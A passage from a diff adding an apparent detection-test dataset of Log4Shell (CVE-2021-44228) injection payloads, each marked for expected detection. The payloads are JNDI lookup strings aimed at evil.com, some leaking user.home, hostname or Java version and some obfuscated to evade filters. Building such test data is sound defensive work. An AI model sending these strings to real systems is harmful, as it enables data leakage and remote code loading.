+    "timestamp": "2026-03-13T21:53:09.060408"
+  },
+  {
+    "id": "log4j_0093",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${sys:user.home}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "141.243.202.89",
+    "timestamp": "2026-03-13T21:53:09.060412"
+  },
+  {
+    "id": "log4j_0094",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "65.191.249.61",
+    "timestamp": "2026-03-13T21:53:09.060417"
+  },
+  {
+    "id": "log4j_0095",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://${sys:java.version}.evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "178.82.157.87",
+    "timestamp": "2026-03-13T21:53:09.060422"
+  },
+  {
+    "id": "log4j_0096",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "30.37.214.62",
+    "timestamp": "2026-03-13T21:53:09.060429"
+  },
+  {
+    "id": "log4j_0097",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "23.131.212.146",
+    "timestamp": "2026-03-13T21:53:09.060434"
+  },
+  {
+    "id": "log4j_0098",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${sys:user.home}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "41.14.12.113",
+    "timestamp": "2026-03-13T21:53:09.060441"
+  },
+  {
+    "id": "log4j_0099",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "175.193.47.150",
+    "timestamp": "2026-03-13T21:53:09.060445"
+  }
+]
